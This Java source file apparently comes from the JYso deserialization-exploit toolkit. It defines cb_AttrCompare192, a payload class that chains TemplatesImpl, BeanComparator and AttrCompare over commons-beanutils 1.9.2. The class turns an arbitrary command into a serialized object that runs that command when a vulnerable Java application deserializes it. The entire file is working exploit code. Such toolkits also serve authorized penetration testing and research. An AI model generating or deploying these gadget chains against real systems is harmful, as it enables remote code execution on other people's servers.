package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;

import static com.qi4l.JYso.gadgets.cb_AttrCompare183.getCbSink_3;

@SuppressWarnings({"rawtypes", "unchecked","unused"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({"水滴"})
public class cb_AttrCompare192 implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);
        AttrNSImpl attrNS1 = new AttrNSImpl();
        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
        attrNS1.setValues(coreDocument, "1", "1", "1");

        BeanComparator beanComparator = new BeanComparator(null, new AttrCompare());

        return getCbSink_3(beanComparator, attrNS1, template);
    }
}
